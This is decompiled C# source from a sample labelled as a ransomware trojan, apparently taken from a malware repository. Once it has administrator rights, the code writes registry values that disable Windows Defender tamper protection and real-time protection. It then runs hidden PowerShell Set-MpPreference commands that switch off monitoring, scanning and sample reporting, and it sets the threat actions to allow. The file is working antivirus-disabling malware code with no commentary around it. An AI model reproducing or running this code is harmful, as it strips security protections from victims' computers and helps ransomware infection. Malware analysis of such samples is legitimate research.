// Decompiled with JetBrains decompiler
// Type: MufMaOSvGyvz.QLRuRgFESyg
// Assembly: Final-02.exe, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C3A0FEE4-03D5-43E6-BB9B-FAFC16FEF04E
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.Win32.Generic-6a5090762c6058bc223e37e89f53832faad80995e3c5ed7e59ed9f5a5e604e47.exe

using Microsoft.Win32;
using System.Diagnostics;
using System.Security.Principal;

namespace MufMaOSvGyvz
{
  public static class QLRuRgFESyg
  {
    public static void PXPqDNdvjDrC()
    {
      if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
        return;
      QLRuRgFESyg.EMcqPPGfGFVx("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
      QLRuRgFESyg.EMcqPPGfGFVx("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
      QLRuRgFESyg.EMcqPPGfGFVx("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
      QLRuRgFESyg.EMcqPPGfGFVx("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
      QLRuRgFESyg.EMcqPPGfGFVx("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
      QLRuRgFESyg.PdnmizvzKFUCL();
    }

    private static void EMcqPPGfGFVx(string string_0, string string_1, string string_2)
    {
      try
      {
        using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree))
        {
          if (registryKey == null)
          {
            Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, (object) string_2, RegistryValueKind.DWord);
          }
          else
          {
            if (registryKey.GetValue(string_1) == (object) string_2)
              return;
            registryKey.SetValue(string_1, (object) string_2, RegistryValueKind.DWord);
          }
        }
      }
      catch
      {
      }
    }

    private static void PdnmizvzKFUCL()
    {
      Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "powershell",
          Arguments = "Get-MpPreference -verbose",
          UseShellExecute = false,
          RedirectStandardOutput = true,
          WindowStyle = ProcessWindowStyle.Hidden,
          CreateNoWindow = true
        }
      };
      process.Start();
      while (!process.StandardOutput.EndOfStream)
      {
        string str = process.StandardOutput.ReadLine();
        if ((!str.StartsWith("DisableRealtimeMonitoring") ? 1 : (!str.EndsWith("False") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -DisableRealtimeMonitoring $true");
        else if ((!str.StartsWith("DisableBehaviorMonitoring") ? 1 : (!str.EndsWith("False") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -DisableBehaviorMonitoring $true");
        else if ((!str.StartsWith("DisableBlockAtFirstSeen") ? 1 : (!str.EndsWith("False") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -DisableBlockAtFirstSeen $true");
        else if ((!str.StartsWith("DisableIOAVProtection") ? 1 : (!str.EndsWith("False") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -DisableIOAVProtection $true");
        else if ((!str.StartsWith("DisablePrivacyMode") ? 1 : (!str.EndsWith("False") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -DisablePrivacyMode $true");
        else if ((!str.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") ? 1 : (!str.EndsWith("False") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
        else if ((!str.StartsWith("DisableArchiveScanning") ? 1 : (!str.EndsWith("False") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -DisableArchiveScanning $true");
        else if ((!str.StartsWith("DisableIntrusionPreventionSystem") ? 1 : (!str.EndsWith("False") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -DisableIntrusionPreventionSystem $true");
        else if ((!str.StartsWith("DisableScriptScanning") ? 1 : (!str.EndsWith("False") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -DisableScriptScanning $true");
        else if ((!str.StartsWith("SubmitSamplesConsent") ? 1 : (str.EndsWith("2") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -SubmitSamplesConsent 2");
        else if ((!str.StartsWith("MAPSReporting") ? 1 : (str.EndsWith("0") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -MAPSReporting 0");
        else if ((!str.StartsWith("HighThreatDefaultAction") ? 1 : (str.EndsWith("6") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -HighThreatDefaultAction 6 -Force");
        else if ((!str.StartsWith("ModerateThreatDefaultAction") ? 1 : (str.EndsWith("6") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -ModerateThreatDefaultAction 6");
        else if ((!str.StartsWith("LowThreatDefaultAction") ? 1 : (str.EndsWith("6") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -LowThreatDefaultAction 6");
        else if ((!str.StartsWith("SevereThreatDefaultAction") ? 1 : (str.EndsWith("6") ? 1 : 0)) == 0)
          QLRuRgFESyg.tMApihKJxn("Set-MpPreference -SevereThreatDefaultAction 6");
      }
    }

    public static void tMApihKJxn(string string_0) => new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = string_0,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    }.Start();
  }
}
